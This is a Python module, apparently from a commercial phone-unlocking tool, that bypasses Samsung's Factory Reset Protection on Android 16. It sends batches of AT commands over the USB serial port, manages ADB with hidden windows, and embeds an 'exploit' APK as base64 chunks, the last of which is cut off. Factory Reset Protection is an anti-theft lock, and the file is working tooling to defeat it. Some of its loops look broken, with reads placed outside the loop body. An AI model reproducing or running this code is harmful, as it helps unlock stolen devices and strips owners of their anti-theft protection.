'''
================================================================================
­ƒöÑ TECH UNION SOLUTIONS - FRP Android 16 Samsung (M├®todo Definitivo)
================================================================================
M├│dulo validado em 14/12/2025 ├ás 18:46
Dispositivo Testado: Samsung Galaxy Tab S9 FE (SM-X510)
Resultado: Ô£à SUCESSO TOTAL - FRP removido sem necessidade de ADB posterior!
IMPORTANTE:
- Este m├®todo N├âO requer comandos ADB ap├│s o Factory Reset
- Utiliza m├®todo BATCH (rajada) para envio de comandos
- Arquivos exploit s├úo lidos de app/resources/exploits/
ÔÜá´©Å AVISO: Use apenas em dispositivos pr├│prios ou com autoriza├º├úo
================================================================================
'''
import serial
import serial.tools.list_ports
import subprocess
import time
import os
import logging
import platform
from datetime import datetime
from typing import (Optional, Dict, List, Tuple, Callable)
logger = logging.getLogger(__name__)
class SamsungAndroid16FRP:
    '''
    Classe para FRP Bypass Android 16 Samsung - M├®todo Definitivo
    Este m├®todo foi validado e funciona sem necessidade de comandos ADB
    ap├│s o Factory Reset final.
    '''
    SAMSUNG_VID = 1256
    BAUDRATE = 115200
    def __init__(self):
        self.serial_port = None
        self.is_connected = False
        self.logs = []
        self._log_callback = None
        self._exploits_dir = None
        self.startupinfo = None
        self.creation_flags = 0
        if os.name == 'nt':
            self.startupinfo = subprocess.STARTUPINFO()
            self.startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            self.startupinfo.wShowWindow = subprocess.SW_HIDE
            self.creation_flags = subprocess.CREATE_NO_WINDOW
        self._adb_path = self._find_adb_path()
        self._find_exploits_dir()
    def _find_adb_path(self) -> str:
        '''
        Encontra o caminho correto do ADB para evitar conflito de vers├Áes.
        PROBLEMA IDENTIFICADO:
        - O UNION usa C:\\platform-tools\\adb.exe (vers├úo 41)
        - O PATH pode ter outra vers├úo (vers├úo 40)
        - Quando h├í conflito, aparece: "adb server version doesn't match"
        SOLU├ç├âO: Usar SEMPRE o mesmo ADB do UNION (prioridade C:\\platform-tools)
        '''
        try:
            from app.utils.path_manager import PathManager
            pm_adb = PathManager.get_adb_path()
            if pm_adb and os.path.isfile(pm_adb):
                logger.info(f'­ƒôü ADB via PathManager: {os.path.basename(pm_adb)}')
                return pm_adb
        except Exception:
            pass
        if os.name == 'nt':
            windows_adb = 'C:\\platform-tools\\adb.exe'
            if os.path.exists(windows_adb):
                logger.info('­ƒôü ADB fallback externo')
                return windows_adb
        logger.warning('ÔÜá´©Å Usando ADB do PATH - fallback')
        return 'adb'
    def _find_exploits_dir(self):
        '''Localiza a pasta com os arquivos de exploit'''
        possible_paths = [os.path.join(os.path.dirname(__file__), '..', 'resources', 'exploits'), os.path.join(os.path.dirname(__file__), '..', '..', 'resources', 'exploits'), os.path.join(os.path.dirname(__file__), '..', '..', '..', 'platform-tools'), os.path.join(os.path.dirname(__file__), '..', '..', 'platform-tools'), os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'platform-tools'), os.path.join(os.path.dirname(__file__), '..', '..', '..', 'resources', 'platform-tools')]
        for path in possible_paths:
            abs_path = os.path.abspath(path)
            if os.path.exists(abs_path):
                apk_path = os.path.join(abs_path, 'exploit_base.apk')
                dex_path = os.path.join(abs_path, 'exploit_classes.dex')
                if not os.path.exists(apk_path):
                    continue
                if os.path.exists(dex_path):
                    self._exploits_dir = abs_path
                    logger.info(f'­ƒôü Exploits encontrados em: {abs_path}')
                    return
        for path in possible_paths:
            abs_path = os.path.abspath(path)
            if os.path.exists(abs_path):
                self._exploits_dir = abs_path
                logger.warning(f'ÔÜá´©Å Usando diret├│rio fallback: {abs_path}')
                return
        logger.error('ÔØî Nenhum diret├│rio de exploits encontrado!')
    def set_log_callback(self, callback: Callable[[str], None]):
        '''Define callback para logs em tempo real'''
        self._log_callback = callback
    def log(self, message: str, level: str='info'):
        '''Adiciona log e chama callback se existir'''
        timestamp = datetime.now().strftime('%H:%M:%S')
        full_msg = f'[{timestamp}] {message}'
        self.logs.append(full_msg)
        if level == 'error':
            logger.error(message)
        elif level == 'warning':
            logger.warning(message)
        else:
            logger.info(message)
        if self._log_callback:
            try:
                self._log_callback(message)
                return
            except Exception:
                pass
    def find_samsung_ports(self) -> List[str]:
        '''Encontra portas Samsung dispon├¡veis'''
        samsung_ports = []
        for port in serial.tools.list_ports.comports():
            if port.vid == self.SAMSUNG_VID:
                samsung_ports.append(port.device)
        return samsung_ports
    def connect(self, port_name: str) -> bool:
        '''Conecta ├á porta serial Samsung'''
        try:
            if self.serial_port and self.serial_port.is_open:
                self.serial_port.close()
                time.sleep(0.5)
            self.serial_port = serial.Serial(port=port_name, baudrate=self.BAUDRATE, timeout=3.0, write_timeout=5.0, bytesize=serial.EIGHTBITS, parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, rtscts=False, dsrdtr=False, xonxoff=False)
            time.sleep(0.5)
            if self.serial_port.is_open:
                self.is_connected = True
                self.log(f'Porta {port_name} ...: Conectada')
                return True
        except Exception as e:
            logger.error(f'Erro de conex├úo: {e}')
        self.is_connected = False
        return False
    def disconnect(self):
        '''Desconecta da porta serial'''
        try:
            if self.serial_port and self.serial_port.is_open:
                self.serial_port.close()
        except Exception:
            pass
        finally:
            self.serial_port = None
            self.is_connected = False
    def _test_serial_connection(self) -> bool:
        '''
        Testa se a conex├úo serial ainda est├í funcionando
        Retorna False se a porta foi desconectada (reconex├úo USB)
        '''
        if not self.serial_port or not self.is_connected:
            return False
        try:
            if not self.serial_port.is_open:
                return False
            self.serial_port.reset_input_buffer()
            return True
        except (serial.SerialException, PermissionError, OSError):
            self.is_connected = False
            return False
        except Exception:
            return False
    def _run_adb_command(self, args: List[str], timeout: int=30) -> Tuple[int, str, str]:
        '''
Executa comando ADB seguindo padr├Áes do adb_manager.py
Returns:
    Tuple[returncode, stdout, stderr]
'''
        try:
            cmd = [self._adb_path] + args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return (-1, '', 'Timeout')
        except Exception as e:
            return -1, '', str(e)
    def _restart_adb_server(self):
        '''
        Reinicia o servidor ADB COMPLETAMENTE
        IMPORTANTE: O ADB da aba Samsung pode estar "travado" em algum processo.
        Precisamos garantir uma limpeza completa.
        Baseado no script de teste validado (samsung_frp_android16_test.py)
        '''
        self.log('Preparando comunica├º├úo com dispositivo...')
        try:
            for _ in range(2):
                pass
            try:
                subprocess.run([self._adb_path, 'kill-server'], capture_output=True, timeout=5, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            except subprocess.TimeoutExpired:
                pass
            else:
                time.sleep(1)
                if os.name == 'nt':
                    pass
        except Exception as e:
            self.log(f'Erro de comunica├º├úo: {str(e)[:40]}', 'warning')
            return False
        time.sleep(2)
        try:
            try:
                subprocess.run([self._adb_path, 'start-server'], capture_output=True, timeout=15, startupinfo=self.startupinfo, creationflags=self.creation_flags)
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
        except Exception as e:
            self.log(f'Erro de comunica├º├úo: {str(e)[:40]}', 'warning')
            return False
        time.sleep(3)
        self.log('Comunica├º├úo estabelecida ...: OK')
        return True
    def _check_adb_device(self) -> Optional[str]:
        '''
Verifica se h├í dispositivo ADB conectado
Baseado no script de teste validado (samsung_frp_android16_test.py)
Returns:
    Serial do dispositivo ou None
'''
        try:
            code, stdout, stderr = self._run_adb_command(['devices'], timeout=10)
            if code == 0:
                lines = stdout.strip().split('\n')
                for line in lines[1:]:
                    if '\tdevice' in line:
                        serial = line.split('\t')[0]
                        return serial
                    if '\tunauthorized' in line:
                        serial = line.split('\t')[0]
                        self.log('Dispositivo n├úo autorizado - Aceite a conex├úo no telefone!')
                        return
                    if 'connecting' in line.lower():
                        return
        except Exception:
            return
    def _send_command(self, command: str, wait_time: float=1.0) -> Tuple[bool, str]:
        """
        Envia comando AT e l├¬ resposta.
        REPLICA EXATAMENTE O PADR├âO DE send_at_command do script de teste!
        FORMATO CORRETO PARA CAMEAUTO (extra├¡do dos dados reais):
        - Enviar 'AT\\naT+CAMEAUTO=...' TUDO JUNTO em um ├║nico pacote!
        - Usar apenas \\n (n├úo \\r\\n) entre AT e aT
        - Terminar com \\r\\n
        """
        if not self.serial_port or not self.is_connected:
            return (False, 'N├úo conectado')
        try:
            self.serial_port.reset_input_buffer()
            time.sleep(0.02)
            if command.startswith('aT+CAMEAUTO'):
                full_cmd = f'AT\n{command}\r\n'
                cmd_bytes = full_cmd.encode('ascii', errors='ignore')
                self.serial_port.write(cmd_bytes)
                self.serial_port.flush()
            else:
                cmd_bytes = f'{command}\r\n'.encode('ascii', errors='ignore')
                self.serial_port.write(cmd_bytes)
                self.serial_port.flush()
            time.sleep(wait_time)
            buffer = b''
            start_time = time.time()
            max_wait = wait_time + 1.5
            no_data_count = 0
            while time.time() - start_time < max_wait:
                pass
            try:
                if self.serial_port.in_waiting > 0:
                    buffer += self.serial_port.read(self.serial_port.in_waiting)
                    no_data_count = 0
                    time.sleep(0.05)
            except (serial.SerialException, PermissionError, OSError) as e:
                return (True, 'USB_RECONNECT')
        except PermissionError as e:
            if 'broadcast' in command.lower() or 'ACTION_USBDEBUG' in command:
                return (True, 'USB_RECONNECT')
            return (True, 'USB_RECONNECT')
        except serial.SerialException as e:
            if 'ClearCommError' in str(e) or 'PermissionError' in str(e):
                return (True, 'USB_RECONNECT')
            return (True, 'USB_RECONNECT')
        except Exception as e:
            error_str = str(e)
            if 'Permission' in error_str or 'Acesso' in error_str or 'ClearComm' in error_str:
                return (True, 'USB_RECONNECT')
            logger.error(f'Erro ao enviar comando: {e}')
            return False, str(e)
        try:
            response = buffer.decode('ascii', errors='ignore')
            success = self._check_response(command, response)
        except PermissionError as e:
            if 'broadcast' in command.lower() or 'ACTION_USBDEBUG' in command:
                return (True, 'USB_RECONNECT')
            return (True, 'USB_RECONNECT')
        except serial.SerialException as e:
            if 'ClearCommError' in str(e) or 'PermissionError' in str(e):
                return (True, 'USB_RECONNECT')
            return (True, 'USB_RECONNECT')
        except Exception as e:
            error_str = str(e)
            if 'Permission' in error_str or 'Acesso' in error_str or 'ClearComm' in error_str:
                return (True, 'USB_RECONNECT')
            logger.error(f'Erro ao enviar comando: {e}')
            return False, str(e)
        return success, response
    def _check_response(self, command: str, response: str) -> bool:
        '''Verifica se a resposta indica sucesso (IGUAL AO SCRIPT DE TESTE!)'''
        if 'SWATD' in command:
            return '[DR]: CHANGE TO' in response or '[ATD]: CHANGE TO' in response
        if 'DEVCONINFO' in command:
            return '+DEVCONINFO:' in response
        if 'ACTIVATE' in command:
            return '+USB' in response or '+ACTIVATE:0,OK' in response
        if 'CAMEAUTO' in command:
            return '+CAMEAUTO:0,OK' in response or 'OK' in response
        if 'FACTORST' in command:
            return '+FACTORST:0' in response
        return 'OK' in response or 'ERROR' not in response.upper()
    def _send_cameauto_batch(self, commands: List[str], batch_name: str='BATCH') -> int:
        '''
        M├ëTODO BATCH - REPLICA EXATAMENTE send_batch_cameauto DO SCRIPT DE TESTE!
        CONFORME DOCUMENTA├ç├âO (android16-com2--refeita.txt):
        - Linhas 24-75: TODOS os comandos s├úo enviados em RAJADA
        - Linhas 80-91: As 12 respostas +CAMEAUTO:0,OK v├¬m TODAS DE UMA VEZ
        Este m├®todo replica o comportamento REAL do software original.
        '''
        if not self.serial_port or not self.is_connected:
            self.log('ÔØî N├úo conectado!', 'error')
            return 0
        try:
            self.serial_port.reset_input_buffer()
            self.serial_port.reset_output_buffer()
            time.sleep(0.05)
            self.log(f'Processando {len(commands)} pacotes de dados...')
            self.log('Isso pode levar alguns segundos... Aguarde!')
            for i, cmd in enumerate(commands):
                if cmd.startswith('aT+CAMEAUTO'):
                    full_cmd = f'AT\n{cmd}\r\n'
                else:
                    full_cmd = f'{cmd}\r\n'
                cmd_bytes = full_cmd.encode('ascii', errors='ignore')
                self.serial_port.write(cmd_bytes)
                logger.debug(f'Batch CMD [{i + 1}/{len(commands)}]: {cmd[:30]}...')
                time.sleep(0.01)
            self.serial_port.flush()
            self.log('Comunicando com servidor Samsung...')
            start_time = time.time()
            buffer = b''
            batch_timeout = 7.0
            no_data_count = 0
            while time.time() - start_time < batch_timeout:
                pass
            try:
                if self.serial_port.in_waiting > 0:
                    chunk = self.serial_port.read(self.serial_port.in_waiting)
                    buffer += chunk
                    no_data_count = 0
            except (serial.SerialException, PermissionError, OSError):
                self.log('   ­ƒöä USB reconectando...')
                return len(commands)
        except (serial.SerialException, PermissionError, OSError) as e:
            self.log(f'   ­ƒöä USB reconectando: {e}')
            return len(commands)
        except Exception as e:
            self.log(f'ÔØî Erro no batch: {e}', 'error')
            return 0
        try:
            response_str = buffer.decode('ascii', errors='ignore')
            ok_count = response_str.count('+CAMEAUTO:0,OK')
            if ok_count > 0:
                self.log(f'Responses Received: {ok_count}x OK')
                return ok_count
            self.log(f'Response: {response_str[:100] if response_str else '(empty)'}')
        except (serial.SerialException, PermissionError, OSError) as e:
            self.log(f'   ­ƒöä USB reconectando: {e}')
            return len(commands)
        except Exception as e:
            self.log(f'ÔØî Erro no batch: {e}', 'error')
            return 0
        return ok_count
    def _get_apk_base64_parts(self) -> List[str]:
        '''Retorna as partes base64 do APK exploit'''
        return ['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